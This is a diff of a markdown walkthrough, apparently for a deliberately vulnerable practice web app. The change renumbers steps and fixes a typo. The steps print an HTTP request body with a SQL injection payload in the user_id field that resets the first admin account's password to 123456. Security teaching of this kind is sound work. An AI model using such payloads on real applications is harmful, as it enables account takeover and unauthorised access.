@@ -32,8 +32,8 @@ This is one way of doing a command injection:
     ```
     csrfmiddlewaretoken=GH8SDbVSwfmxi48PtglTK5i8j9QAIw1IqlWQ9NOLvhTcAe7gDGODqx59qqJvrKK4&user_id=1&email=&first_name=&last_name=&password=&confirm=
     ```
-6. Execute a SQL injection as below and resend the request:
+5. Execute a SQL injection as below and resend the request:
     ```
     csrfmiddlewaretoken=GH8SDbVSwfmxi48PtglTK5i8j9QAIw1IqlWQ9NOLvhTcAe7gDGODqx59qqJvrKK4&user_id=1' OR is_admin = '1&email=&first_name=&last_name=&password=123456&confirm=123456
     ```
-7. This injection changes the a first found admin's password to 123456
+6. This injection changes the first found admin's password to 123456 
